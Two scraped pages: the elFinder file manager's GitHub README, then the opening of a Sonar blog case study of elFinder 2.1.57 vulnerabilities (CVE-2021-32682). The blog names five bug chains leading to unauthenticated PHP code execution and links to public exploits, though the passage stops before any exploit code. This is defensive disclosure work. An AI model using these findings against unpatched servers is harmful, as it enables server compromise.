[4.7k
stars](/Studio-42/elFinder/stargazers) [1.4k
forks](/Studio-42/elFinder/forks) [Branches](/Studio-42/elFinder/branches) [Tags](/Studio-42/elFinder/tags) [Activity](/Studio-42/elFinder/activity)
 [Star](/login?return_to=%2FStudio-42%2FelFinder)

 [Notifications](/login?return_to=%2FStudio-42%2FelFinder) You must be signed in to change notification settings

* [Code](/Studio-42/elFinder)
* [Issues
  4](/Studio-42/elFinder/issues)
* [Pull requests
  6](/Studio-42/elFinder/pulls)
* [Discussions](/Studio-42/elFinder/discussions)
* [Actions](/Studio-42/elFinder/actions)
* [Wiki](/Studio-42/elFinder/wiki)
* [Security](/Studio-42/elFinder/security)
* [Insights](/Studio-42/elFinder/pulse)

Additional navigation options

* [Code](/Studio-42/elFinder)
* [Issues](/Studio-42/elFinder/issues)
* [Pull requests](/Studio-42/elFinder/pulls)
* [Discussions](/Studio-42/elFinder/discussions)
* [Actions](/Studio-42/elFinder/actions)
* [Wiki](/Studio-42/elFinder/wiki)
* [Security](/Studio-42/elFinder/security)
* [Insights](/Studio-42/elFinder/pulse)

# Studio-42/elFinder

    master[Branches](/Studio-42/elFinder/branches)[Tags](/Studio-42/elFinder/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[6,885 Commits](/Studio-42/elFinder/commits/master/) | | |
| [.github](/Studio-42/elFinder/tree/master/.github ".github") | | [.github](/Studio-42/elFinder/tree/master/.github ".github") |  |  |
| [css](/Studio-42/elFinder/tree/master/css "css") | | [css](/Studio-42/elFinder/tree/master/css "css") |  |  |
| [files](/Studio-42/elFinder/tree/master/files "files") | | [files](/Studio-42/elFinder/tree/master/files "files") |  |  |
| [img](/Studio-42/elFinder/tree/master/img "img") | | [img](/Studio-42/elFinder/tree/master/img "img") |  |  |
| [jquery](/Studio-42/elFinder/tree/master/jquery "jquery") | | [jquery](/Studio-42/elFinder/tree/master/jquery "jquery") |  |  |
| [js](/Studio-42/elFinder/tree/master/js "js") | | [js](/Studio-42/elFinder/tree/master/js "js") |  |  |
| [php](/Studio-42/elFinder/tree/master/php "php") | | [php](/Studio-42/elFinder/tree/master/php "php") |  |  |
| [sounds](/Studio-42/elFinder/tree/master/sounds "sounds") | | [sounds](/Studio-42/elFinder/tree/master/sounds "sounds") |  |  |
| [.gitignore](/Studio-42/elFinder/blob/master/.gitignore ".gitignore") | | [.gitignore](/Studio-42/elFinder/blob/master/.gitignore ".gitignore") |  |  |
| [Changelog](/Studio-42/elFinder/blob/master/Changelog "Changelog") | | [Changelog](/Studio-42/elFinder/blob/master/Changelog "Changelog") |  |  |
| [Jakefile.js](/Studio-42/elFinder/blob/master/Jakefile.js "Jakefile.js") | | [Jakefile.js](/Studio-42/elFinder/blob/master/Jakefile.js "Jakefile.js") |  |  |
| [LICENSE.md](/Studio-42/elFinder/blob/master/LICENSE.md "LICENSE.md") | | [LICENSE.md](/Studio-42/elFinder/blob/master/LICENSE.md "LICENSE.md") |  |  |
| [README.md](/Studio-42/elFinder/blob/master/README.md "README.md") | | [README.md](/Studio-42/elFinder/blob/master/README.md "README.md") |  |  |
| [composer.json](/Studio-42/elFinder/blob/master/composer.json "composer.json") | | [composer.json](/Studio-42/elFinder/blob/master/composer.json "composer.json") |  |  |
| [elfinder-minimal.html](/Studio-42/elFinder/blob/master/elfinder-minimal.html "elfinder-minimal.html") | | [elfinder-minimal.html](/Studio-42/elFinder/blob/master/elfinder-minimal.html "elfinder-minimal.html") |  |  |
| [elfinder.html](/Studio-42/elFinder/blob/master/elfinder.html "elfinder.html") | | [elfinder.html](/Studio-42/elFinder/blob/master/elfinder.html "elfinder.html") |  |  |
| [elfinder.legacy.html](/Studio-42/elFinder/blob/master/elfinder.legacy.html "elfinder.legacy.html") | | [elfinder.legacy.html](/Studio-42/elFinder/blob/master/elfinder.legacy.html "elfinder.legacy.html") |  |  |
| [elfinder.playground.html](/Studio-42/elFinder/blob/master/elfinder.playground.html "elfinder.playground.html") | | [elfinder.playground.html](/Studio-42/elFinder/blob/master/elfinder.playground.html "elfinder.playground.html") |  |  |
| [elfinder.src.html](/Studio-42/elFinder/blob/master/elfinder.src.html "elfinder.src.html") | | [elfinder.src.html](/Studio-42/elFinder/blob/master/elfinder.src.html "elfinder.src.html") |  |  |
| [main-minimal.default.js](/Studio-42/elFinder/blob/master/main-minimal.default.js "main-minimal.default.js") | | [main-minimal.default.js](/Studio-42/elFinder/blob/master/main-minimal.default.js "main-minimal.default.js") |  |  |
| [main.default.js](/Studio-42/elFinder/blob/master/main.default.js "main.default.js") | | [main.default.js](/Studio-42/elFinder/blob/master/main.default.js "main.default.js") |  |  |
| [package.json](/Studio-42/elFinder/blob/master/package.json "package.json") | | [package.json](/Studio-42/elFinder/blob/master/package.json "package.json") |  |  |
| View all files | | |

## Repository files navigation

* README
* License
# elFinder

**WARNING: IF YOU HAVE OLDER (IN PARTICULAR 2.1.62 OR EARLIER) VERSIONS OF ELFINDER ON PUBLIC SERVERS, IT MAY CAUSE SERIOUS DAMAGE TO YOUR SERVER AND VISITED USER. YOU SHOULD UPDATE TO THE LATEST VERSION OR REMOVE IT FROM THE SERVER.**

[![elFinder file manager for the Web](https://camo.githubusercontent.com/1f8e1bd2360fee83805614a4fbd6cf55ab2f1abbd84d66d5bee308f79617f0ff/68747470733a2f2f73747564696f2d34322e6769746875622e696f2f656c46696e6465722f696d616765732f656c46696e6465725363722e706e67 "elFinder file manager for the Web")](https://studio-42.github.io/elFinder/)

elFinder is an open-source file manager for web, written in JavaScript using
jQuery UI. Creation is inspired by simplicity and convenience of Finder program
used in Mac OS X operating system.

[![Download now!](https://camo.githubusercontent.com/45a6cf3e47791bbfc043b5731ec35fb402c6aacee288af844472d685f7d225c7/68747470733a2f2f73747564696f2d34322e6769746875622e696f2f656c46696e6465722f696d616765732f646f776e6c6f61642d69636f6e2e706e67)](https://github.com/Studio-42/elFinder/releases/latest)
[![Packagist License](https://camo.githubusercontent.com/5839346aeafa422ae09c5b2d35826b59649f139785202188dd0c2a2b15b777a1/68747470733a2f2f706f7365722e707567782e6f72672f73747564696f2d34322f656c66696e6465722f6c6963656e73652e706e67)](https://choosealicense.com/licenses/bsd-3-clause/)
[![Latest Stable Version](https://camo.githubusercontent.com/adff644d2f2ae5667709e4dc7052380347ba1d2b0766ae969a35e14ce113e5ad/68747470733a2f2f706f7365722e707567782e6f72672f73747564696f2d34322f656c66696e6465722f76657273696f6e2e706e67)](https://packagist.org/packages/studio-42/elfinder)
[![Total Downloads](https://camo.githubusercontent.com/2ce6de5c3cc18ab619b332533c78f41a91f48e8f8868e98bf76d3a1a69d4acde/68747470733a2f2f706f7365722e707567782e6f72672f73747564696f2d34322f656c66696e6465722f642f746f74616c2e706e67)](https://packagist.org/packages/studio-42/elfinder)
[![CDNJS version](https://camo.githubusercontent.com/eadf180ae40fa242c7528a6ea369716457f09136ab96224fea4fa74c5647f08e/68747470733a2f2f696d672e736869656c64732e696f2f63646e6a732f762f656c66696e6465722e737667)](https://cdnjs.com/libraries/elfinder)
[![Donate Paypal(nao-pon)](https://camo.githubusercontent.com/2b3b3f38604d749b543e8577afdc6bd9fab25244f6cb16bfb713273a74350fd7/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f446f6e6174652d50617950616c2d677265656e2e737667)](https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=FF5FKRSMKYDVA)
[![Donate Bitcoin(nao-pon)](https://camo.githubusercontent.com/d0e4392575cfa8c40651c7d6c6c6ae0ce938fafbc81e3bca927d1cf5dd9da75b/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f446f6e6174652d426974636f696e2d6f72616e67652e737667)](https://studio-42.github.io/elFinder/tools/donate-bitcoin/)
[![Buy me a coffee](https://camo.githubusercontent.com/716560d6d0ee7f665f4975e1b42b76251fe190150276dff437fc5f9c9eb0015e/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76312e7376673f6c6162656c3d4275792532306d6525323061253230636f66666565266d6573736167653d25463025394625413525413826636f6c6f723d626c61636b266c6f676f3d6275792532306d6525323061253230636f66666565266c6f676f436f6c6f723d7768697465266c6162656c436f6c6f723d366634653337)](https://www.buymeacoffee.com/naopon)

## Contents

* [Branches](#branches)
* [Features](#features)
* [Requirements](#requirements)
* [Installation](#installation)
* [Downloads](#downloads)
* [Demo Sites](#demo-sites)
* [FAQs](#faqs)
* [3rd Party Connectors](#3rd-party-connectors)
* [3rd Party Volume Drivers](#3rd-party-volume-drivers)
* [3rd Party Themes](#3rd-party-themes)
* [Support](#support)
* [Authors](#authors)
* [License](#license)

## Branches

* [master](https://github.com/Studio-42/elFinder/tree/master) - Main development branch
* [2.1-src](https://github.com/Studio-42/elFinder/tree/2.1-src) - 2.1 development branch, auto build to 2.1 on commit
* [2.1](https://github.com/Studio-42/elFinder/tree/2.1) - 2.1 nightly build branch

## Features

* Usability like the MacOS Finder or Windows Explorer
* Mobile friendly view for touch devices
* All operations with files and folders on a remote server (copy, move,
  upload, create folder/file, rename, etc.)
* High performance server backend and light client UI
* Multi-root support
* Local file system, MySQL, FTP, SFTP, Box, Dropbox, GoogleDrive and OneDrive volume storage drivers
* Support AWS S3, Azure, Digital Ocean Spaces and more with [League\Flysystem](https://github.com/barryvdh/elfinder-flysystem-driver) Flysystem driver
* Cloud storage (Box, Dropbox, GoogleDrive and OneDrive) drivers
* Background file/folder upload with Drag & Drop HTML5 support
* Chunked file upload for large file
* Upload directly to the folder
* Upload form URL (or list)
* List and Icons view
* Keyboard shortcuts
* Standard methods of file/group selection using mouse or keyboard
* Move/Copy files with Drag & Drop
* Drag & Drop to outside by starting drag with alt/option key press
* Archives create/extract (zip, rar, 7z, tar, gzip, bzip2)
* Rich context menu and toolbar
* Quicklook, preview for common file types
* Edit text files and images
* "Places" for your favorites
* Calculate directory sizes
* Thumbnails for image, movie files
* Easy to integrate with web editors (elRTE, CKEditor, TinyMCE)
* Flexible configuration of access rights, upload file types, user interface
  and other
* Extensibility by event handling of backend and client side
* Simple client-server API based on JSON
* Supports custom information in info dialog
* Configuable columns of list view
* Supports custom CSS class function for the custom folder icon
* Connector plugin
  + [AutoRotate](https://github.com/Studio-42/elFinder/blob/2.1-src/php/plugins/AutoRotate/plugin.php) : Auto rotation on file upload of JPEG file by EXIF Orientation.
  + [AutoResize](https://github.com/Studio-42/elFinder/blob/2.1-src/php/plugins/AutoResize/plugin.php) : Auto resize on file upload.
  + [Normalizer](https://github.com/Studio-42/elFinder/blob/2.1-src/php/plugins/Normalizer/plugin.php) : UTF-8 Normalizer of file-name and file-path etc.
  + [Sanitizer](https://github.com/Studio-42/elFinder/blob/2.1-src/php/plugins/Sanitizer/plugin.php) : Sanitizer of file-name and file-path etc.
  + [Watermark](https://github.com/Studio-42/elFinder/blob/2.1-src/php/plugins/Watermark/plugin.php) : Print watermark on file upload.
* For more details, see the [Changelog](https://github.com/Studio-42/elFinder/blob/master/Changelog)

## Requirements

### jQuery / jQuery UI

* jQuery 1.8.0+
* jQuery UI 1.9.0+
  + Required: draggable, droppable, resizable, selectable, button and slider
  + Recommend: sorter (To make sortable the List column and the Places)

**However, we recommend newest version.**

### Client

* Modern browsers both of desktop or mobile. elFinder was tested in newest Chrome, Edge, Firefox, IE and Opera
  + **Caution**: Web App mode ("apple-mobile-web-app-capable" meta tag) on iOS is not work perfectly in elFinder

### Server

* Any web server
* PHP 5.2+ (Recommend PHP 5.4 or higher) And for thumbnails - GD / Imagick module / convert(imagemagick) require
  + Recommend PHP 7.1 or higher to supports non-ASCII character of file path/name on the Windows server

## Installation

### Builds (compressed)

1. Download and unzip one of the [builds](#downloads) below to your PHP server
2. Rename `/php/connector.minimal.php-dist` to `/php/connector.minimal.php`
3. Load `/elfinder.html` in your browser to run elFinder

### Source (uncompressed)

1. Clone this repository to your PHP server

   ```
   $ git clone https://github.com/Studio-42/elFinder.git

   ```
2. Rename `/php/connector.minimal.php-dist` to `/php/connector.minimal.php`
3. Load `/elfinder.src.html` in your browser to run elFinder

### Installer

* [Setup elFinder 2.1.x nightly with Composer](https://github.com/Studio-42/elFinder/tree/gh-pages/tools/installer/setup_with_composer)

## Downloads

**Stable releases** ([Changelog](https://github.com/Studio-42/elFinder/blob/master/Changelog))

* [elFinder 2.1.65](https://github.com/Studio-42/elFinder/archive/2.1.65.zip)
* [elFinder 2.0.9](https://github.com/Studio-42/elFinder/archive/2.0.9.zip) (deprecated)

**Nightly builds**

* [elFinder 2.1.x (Nightly)](https://github.com/Studio-42/elFinder/archive/2.1.zip)

## Demo sites

**2.1.x Nightly**

* <https://studio-42.github.io/elFinder/> (with CORS)

## FAQs

### Should I use elFinder builds (compressed) or source (uncompressed)?

For debugging and development, use the [source](#source-uncompressed). For production, use [builds](#builds-compressed).

### How do I integrate elFinder with CKEditor/TinyMCE/elRTE/etc...?

Check out the [wiki](https://github.com/studio-42/elFinder/wiki#howtos) for individual instructions.

### The procedure of language files created or modified?

You can create or modify the language file to use translation tool. Please refer to the pull request the results to the respective branch.

* [2.1 branch translation tool](http://studio-42.github.io/elFinder/tools/langman/#2.1)

## 3rd party connectors

* [ASP.NET](https://github.com/leniel/elFinder.Net) / [ASP.NET Core](https://github.com/gordon-matt/elFinder.NetCore) / [.NET Standard](https://github.com/mguinness/elFinder.AspNet)
* [Java Servlet](https://github.com/trustsystems/elfinder-java-connector)
* [JavaScript/Efw](https://github.com/efwGrp/efw3.X/blob/master/help/tag.elfinder.md)
* [Nodejs](https://github.com/dekyfin/elfinder-node)
* [Python](https://github.com/Studio-42/elfinder-python)
* [Ruby/Rails](https://github.com/phallstrom/el_finder)

## 3rd party Volume Drivers

* [League\Flysystem (PHP)](https://github.com/barryvdh/elfinder-flysystem-driver) (for elFinder 2.1+) driver for the [Flysystem](https://github.com/thephpleague/flysystem)

## 3rd party Themes

Hint: [How to load CSS with RequireJS?](https://github.com/Studio-42/elFinder/wiki/How-to-load-CSS-with-RequireJS%3F)

* [lokothodida/elfinder-theme-moono](https://github.com/lokothodida/elfinder-theme-moono)
* [lokothodida/elfinder-theme-windows-10](https://github.com/lokothodida/elfinder-theme-windows-10)
* [RobiNN1/elFinder-Material-Theme](https://github.com/RobiNN1/elFinder-Material-Theme)
* [StudioJunkyard/elfinder-boostrap-theme](https://github.com/StudioJunkyard/LibreICONS/tree/master/themes/elFinder)

## 3rd party Integrations

* [Django](https://github.com/mikery/django-elfinder)
* [Drupal](https://gitlab.com/667bdrm/elfinder)
* [Laravel](https://github.com/barryvdh/laravel-elfinder)
* [Roundcube](https://github.com/Offerel/roundcube_elfinder)
* [Symfony](https://github.com/helios-ag/FMElfinderBundle)
* [Tiki Wiki](https://doc.tiki.org/elFinder)
* [WordPress](https://wordpress.org/plugins/file-manager/)
* [XOOPS](https://github.com/nao-pon/xelfinder)
* [XOOPSCube](https://github.com/xoopscube/xelfinder) GUI-based control panel: FTP, cloud storage and editors
* [Yii](http://www.yiiframework.com/extension/elfinder/)
* [Zenphoto](http://www.zenphoto.org/news/elfinder/)

## Support

* [Homepage](http://elfinder.org)
* [Wiki](https://github.com/Studio-42/elFinder/wiki)
* [Issues](https://github.com/Studio-42/elFinder/issues)
* dev@std42.ru

## Authors

* Current main developer: Naoki Sawada hypweb+elfinder@gmail.com [![Buy me a coffee](https://camo.githubusercontent.com/716560d6d0ee7f665f4975e1b42b76251fe190150276dff437fc5f9c9eb0015e/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76312e7376673f6c6162656c3d4275792532306d6525323061253230636f66666565266d6573736167653d25463025394625413525413826636f6c6f723d626c61636b266c6f676f3d6275792532306d6525323061253230636f66666565266c6f676f436f6c6f723d7768697465266c6162656c436f6c6f723d366634653337)](https://www.buymeacoffee.com/naopon)
* Chief developer: Dmitry "dio" Levashov dio@std42.ru
* Maintainer: Troex Nevelin troex@fury.scancode.ru
* Developers: Alexey Sukhotin, Naoki Sawada hypweb+elfinder@gmail.com
* Icons: PixelMixer, [Yusuke Kamiyamane](http://p.yusukekamiyamane.com), [Icons8](https://icons8.com)

We hope our tools will be helpful for you.

## License

elFinder is issued under a 3-clauses BSD license.

* [License terms](https://github.com/Studio-42/elFinder/blob/master/LICENSE.md)

## About

📁 Open-source file manager for web, written in JavaScript using jQuery and jQuery UI

[studio-42.github.io/elFinder/](https://studio-42.github.io/elFinder/ "https://studio-42.github.io/elFinder/")

### Topics

[javascript](/topics/javascript "Topic: javascript")
[php](/topics/php "Topic: php")
[html5](/topics/html5 "Topic: html5")
[filemanager](/topics/filemanager "Topic: filemanager")
[integration](/topics/integration "Topic: integration")
[jquery-ui](/topics/jquery-ui "Topic: jquery-ui")
[ajax](/topics/ajax "Topic: ajax")
[elfinder](/topics/elfinder "Topic: elfinder")
[3rd-party-connectors](/topics/3rd-party-connectors "Topic: 3rd-party-connectors")

### Resources

[Readme](#readme-ov-file)
### License

[View license](#License-1-ov-file)

[Activity](/Studio-42/elFinder/activity)
[Custom properties](/Studio-42/elFinder/custom-properties)
### Stars

[**4.7k**
stars](/Studio-42/elFinder/stargazers)
### Watchers

[**237**
watching](/Studio-42/elFinder/watchers)
### Forks

[**1.4k**
forks](/Studio-42/elFinder/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FStudio-42%2FelFinder&report=Studio-42+%28user%29)

## [Releases 52](/Studio-42/elFinder/releases)

[Version 2.1.64
Latest

Dec 20, 2023](/Studio-42/elFinder/releases/tag/2.1.64)
[+ 51 releases](/Studio-42/elFinder/releases)

## [Packages 0](/orgs/Studio-42/packages?repo_name=elFinder)

No packages published

## [Contributors 190](/Studio-42/elFinder/graphs/contributors)

* [![@nao-pon](https://avatars.githubusercontent.com/u/1412630?s=64&v=4)](https://github.com/nao-pon)
* [![@dio-el-claire](https://avatars.githubusercontent.com/u/488581?s=64&v=4)](https://github.com/dio-el-claire)
* [![@troex](https://avatars.githubusercontent.com/u/436912?s=64&v=4)](https://github.com/troex)
* [![@rajasharma27](https://avatars.githubusercontent.com/u/16103829?s=64&v=4)](https://github.com/rajasharma27)
* [![@RobiNN1](https://avatars.githubusercontent.com/u/11664877?s=64&v=4)](https://github.com/RobiNN1)
* [![@Chaffinch](https://avatars.githubusercontent.com/u/4220798?s=64&v=4)](https://github.com/Chaffinch)
* [![@alexantr](https://avatars.githubusercontent.com/u/4941848?s=64&v=4)](https://github.com/alexantr)
* [![@barryvdh](https://avatars.githubusercontent.com/u/973269?s=64&v=4)](https://github.com/barryvdh)
* [![@lokothodida](https://avatars.githubusercontent.com/u/4363863?s=64&v=4)](https://github.com/lokothodida)
* [![@DIDoS](https://avatars.githubusercontent.com/u/5557268?s=64&v=4)](https://github.com/DIDoS)
* [![@CodeLyokoXtEAM](https://avatars.githubusercontent.com/u/18566890?s=64&v=4)](https://github.com/CodeLyokoXtEAM)
* [![@nmpetkov](https://avatars.githubusercontent.com/u/628801?s=64&v=4)](https://github.com/nmpetkov)
* [![@667bdrm](https://avatars.githubusercontent.com/u/416680?s=64&v=4)](https://github.com/667bdrm)
* [![@flack](https://avatars.githubusercontent.com/u/425166?s=64&v=4)](https://github.com/flack)

[+ 176 contributors](/Studio-42/elFinder/graphs/contributors)

## Languages

* [JavaScript
  66.5%](/Studio-42/elFinder/search?l=javascript)
* [PHP
  28.9%](/Studio-42/elFinder/search?l=php)
* [CSS
  3.9%](/Studio-42/elFinder/search?l=css)
* [HTML
  0.7%](/Studio-42/elFinder/search?l=html)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from blog.sonarsource.com_4a6971b2_20250114_231600.html ===
NEW![Sonar has entered a definitive agreement to acquire Tidelift! Read the press release.](/company/press-releases/sonar-to-acquire-tidelift/) [![](data:image/svg+xml;charset=utf-8...)![sonar logo ](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/8e59bcad-6e39-41dc-abd9-a0e251e8d63f/Sonar%20%282%29.svg?w=128&h=32&auto=format&fit=clip)![sonar logo ](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/8e59bcad-6e39-41dc-abd9-a0e251e8d63f/Sonar%20%282%29.svg?w=128&h=32&auto=format&fit=clip)](/ "Home")

* Solutions

  Use Cases

  [AI-assisted & quality-assured codeEnsure code generated by AI assistants is of the highest quality](/solutions/ai/)[DevOps transformationHarness the full potential of DevOps by reducing roll backs and improving quality of releases](/solutions/devops-transformation/)[Code coverageEnsure code quality and security by facilitating faster debugging through clear visibility of coverage gaps.](/solutions/code-coverage/) [Reduce & manage technical debtMaximize innovation by proactively managing technical debt](/solutions/reduce-technical-debt/)[Secure by designIntegrate code security in compliance with NIST Secure Software Development Framework](/solutions/secure-by-design-code/)[All Use CasesRead more about Sonar Use cases with blog articles, technical articles and developer guides](/solutions/use-cases/)

  Clean Code

  [What is clean codeA detailed definition of Clean Code](/solutions/clean-code/)[Power of clean codeBusiness success built on Clean Code](/solutions/power-of-clean-code/)[Security starts with Clean CodeStatic Application Security Testing with Sonar](/solutions/security/)[Clean as You CodeOur unique approach to Clean Code](/solutions/our-unique-approach/)

  Something For Everyone

  [For DevelopersFind and fix issues as you code](/solutions/for-developers/)[For DevOpsBuild your apps on Clean Code foundations](/solutions/infrastructure-as-code/)[For EnterpriseClean Code delivery from development to production](/solutions/for-enterprise/)[For the Public SectorClean Code for the public sector](/solutions/public-sector/)
* Products

  Industry Leading Products

  [![]()![](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/aa3b1f02-f1b0-448f-a3f2-a1bd32923a08/SQ_Logo_Cloud_Light%20Backgrounds.svg?w=176&h=48&auto=format&fit=crop)Formerly SonarCloudCloud-based static analysis tool for your CI/CD workflows](/products/sonarcloud/)[![]()![](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/bdac1871-464e-4051-88db-7df20c3bfffa/SQ_Logo_Server_Light%20Backgrounds.svg?w=176&h=48&auto=format&fit=crop)Formerly SonarQubeSelf-managed static analysis tool for continuous codebase inspection](/products/sonarqube/)[![]()![](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/49f23af2-a29b-4d0f-95d7-ffd361f375e1/SQ_Logo_IDE_Light%20Backgrounds.svg?w=176&h=48&auto=format&fit=crop)Formerly SonarLintFree IDE extension that provides on-the-fly analysis and coding guidance](/products/sonarlint/)

  Languages and Frameworks

  [Java](/knowledge/languages/java/)[JavaScript](/knowledge/languages/js/)[TypeScript](/knowledge/languages/ts/)[Python](/knowledge/languages/python/)[C#](/knowledge/languages/csharp/)[C++](/knowledge/languages/cpp/)[C](/knowledge/languages/c/)[PHP](/knowledge/languages/php/)[Kotlin](/knowledge/languages/kotlin/)[See All](/lp/knowledge/languages/)
* Resources

  Learn About Clean Code

  [BlogStay connected with our latest development news and articles](/blog/)[Events hubLet's meet up online or in person - browse our conferences and webinars, or watch previous talks](/resources/events/)[Customer StoriesCheck out Sonar implementation success stories](/resources/customer-stories/)[White PapersFind in-depth articles on clean code](/resources/white-papers/)[LearnDeveloper learning hub - covering essential topics](/learn/)[Solution BriefsOur library of solution briefs](/resources/solution-briefs/)

  Go In Depth

  [SonarQube Server DocumentationFind more information on the technical details of SonarQube Server](https://docs.sonarsource.com/sonarqube/latest/)[SonarQube Cloud DocumentationFind more information on the technical details of SonarQube Cloud](https://docs.sonarsource.com/sonarcloud/)[SonarQube for IDE DocumentationFind more information on the technical details of SonarQube IDE](https://docs.sonarsource.com/sonarlint/)[Explore SonarpediaExplore our publicly available multi-language rules database](https://rules.sonarsource.com/)[LanguagesSee our multi-language coverage](/knowledge/languages/)
* Company

  Deliver Better Software

  [About UsSonar’s industry leading solution enables developers to write clean code and remediate existing code organically](/company/about/)[CareersJoin our growing team](/company/careers/)[Commitment to open sourceOur commitment to transparency, security, and continuous improvement](/solutions/commitment-to-open-source/)[CommunityGet latest updates, suggest features, and share your knowledge](https://community.sonarsource.com/)[PartnersSonar partners with the best resellers to bring Clean Code closer to you](/company/partners/)[Contact usHave questions? Get in touch](/company/contact/)

  Media

  [NewsroomNews announcements, media coverage, and more](/company/newsroom/)[CoverageFind articles about Sonar in the news](/company/coverage/)[Press ReleasesThe latest Sonar updates](/company/press-releases/)[CustomersAn overview of customers using Sonar by industry](/company/customers/)[Press KitExecutive headshots, quick stats, customer logos, and more](/company/press-kit/)
[Start for free](/open-source-editions/)[Explore pricing](/plans-and-pricing/)
Search modal toggle button[Start for free](/open-source-editions/)[Explore pricing](/plans-and-pricing/)Mobile menu toggle button

Blog post

# elFinder - A Case Study of Web File Manager Vulnerabilities

![](data:image/svg+xml;charset=utf-8...)![Thomas Chauchefoin photo]()![Thomas Chauchefoin photo](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/ddfcf9fd-16c2-4f57-8922-4198a01b5c2a/b0f43e1e-d67e-4bcf-a90c-0a1908c2b772_Thomas_Chauchefoin.jpg?w=800&h=800&auto=format&fit=crop)

Thomas Chauchefoin

Vulnerability Researcher

August 17, 2021

Date

* [Security](/blog/tag/security/)
![](data:image/svg+xml;charset=utf-8...)![Our case study of elFinder 2.1.57 describes several critical code vulnerabilities commonly found in web file managers and how to patch them.](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/0b2f16b3-5e3a-4f36-b8f2-a303e0e4f74b/cover-287ee4a6-069f-4503-a54e-a156cf80dcfc_elFinder%2BBlogpost%2B%25402x.png?w=2400&h=1200&auto=format&fit=crop)![Our case study of elFinder 2.1.57 describes several critical code vulnerabilities commonly found in web file managers and how to patch them.](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/0b2f16b3-5e3a-4f36-b8f2-a303e0e4f74b/cover-287ee4a6-069f-4503-a54e-a156cf80dcfc_elFinder%2BBlogpost%2B%25402x.png?w=2400&h=1200&auto=format&fit=crop)

An application’s interaction with the file system is always highly security sensitive since minor functional bugs can easily be the source of exploitable vulnerabilities. This observation is especially true in the case of web file managers, whose role is to replicate the features of a complete file system and expose it to the client’s browser in a transparent way.

elFinder is a popular web file manager often used in CMS and frameworks, such as WordPress plugins (wp-file-manager) or Symfony bundles, to allow easy operations on both local and remote files. In the past, elFinder has been part of active in-the-wild attacks targeting unsafe configuration or actual code vulnerabilities. Thus, elFinder is published with a safe default configuration to prevent any malicious use by attackers.

As part of our regular assessment of widely deployed open-source projects, we discovered multiple new code vulnerabilities in elFinder. In the following case study of common code vulnerabilities in web file managers, we describe five different vulnerability chains and demonstrate how they could be exploited to gain control of the underlying server and its data. We will also discuss some of the patches that were later implemented by the vendor to show how to prevent them in your own code.

## Impact

We worked on the development branch, commit [f9c906d](https://github.com/Studio-42/elFinder/commit/f9c906d808d1721a62fc2a4fdb38d77c1c1ff229 "f9c906d"). Findings were also confirmed on release 2.1.57; all affect the default configuration (unless specified otherwise in this article) and do not require prior authentication. As we mentioned, the exploitation of these vulnerabilities can let an attacker execute arbitrary PHP code on the server where elFinder is installed, ultimately leading to its compromise.

The findings we discuss in this blog post (all assigned to CVE-2021-32682) and successfully exploited to gain code execution are:

* Deleting Arbitrary Files
* Moving Arbitrary Files
* Uploading PHP Files
* Argument Injection
* Race Condition

All these bug classes are very common in software that exposes filesystems to users, and are likely to impact a broad range of products, not only elFinder.

elFinder released version 2.1.59 to address all the bugs we responsibly disclosed. There is no doubt these vulnerabilities will also be exploited in the wild, because exploits [targeting old versions have been publicly released](https://www.exploit-db.com/search?text=connector.minimal.php "targeting old versions have been publicly released") and the connectors filenames are part of [compilations](https://github.com/koaj/ffw-content-discovery/blob/9bda1a1ebde71e84bcfde15c46524527bb24087f/cve-wordlist.txt "compilations") of paths to look for when trying to compromise websites. Hence, we highly recommend that all users immediately upgrade elFinder to the latest version.

## Technical Details

elFinder comes with a back end (also called *connector*) written in PHP and a front end written in HTML and JavaScript. The *connector* is the main script that dispatches the actions of the front end code to the right back end code to implement file system features. Connectors can be configured to disallow dangerous actions, restrict uploads to specific MIME types: two different ones are part of the default install. We detected vulnerabilities in the so-called “minimal” connector. It only allows image and plain text uploads and FTP is the only supported remote virtual filesystem: this is presumably the safest one and the most likely to be deployed.

To give a better understanding of the code snippets we will use to demonstrate our findings, we will first describe how elFinder’s routing works. Like in many modern PHP applications, the connector (e.g. `connector.minimal.php`) is the only entry point. It declares configuration directives and closures and then instantiates both `elFinder` (the core) and `elFinderConnector` (the interface between `elFinder` and the transport channel, here HTTP).

The attribute `elFinder::$commands` contains every valid action and the expected arguments:

**php/elFinder.class.php**

```
protected $commands = array(
  'abort' => array('id' => true),
  'archive' => array('targets' => true, 'type' => true, 'mimes' => false, 'name' => false),
  'callback' => array('node' => true, 'json' => false, 'bind' => false, 'done' => false),
  'chmod' => array('targets' => true, 'mode' => true),
  'dim' => array('target' => true, 'substitute' => false),
  'duplicate' => array('targets' => true, 'suffix' => false),
  // [...]
```

The user can call any of these commands by providing the `cmd` parameter with the required command parameter via `PATH_INFO`, `GET`, or `POST`. In each command handler, parameters are accessed using `$args`.

To allow remote filesystems (FTP, Dropbox, etc.) to be used with local ones, elFinder implements a filesystem abstraction layer (`elFinderVolumeDriver`) on top of which all drivers are built. Files are then referenced by their volume name (e.g. `t1_` is the trash, `l1_` the default local volume) and the URL-safe Base64 of their name.

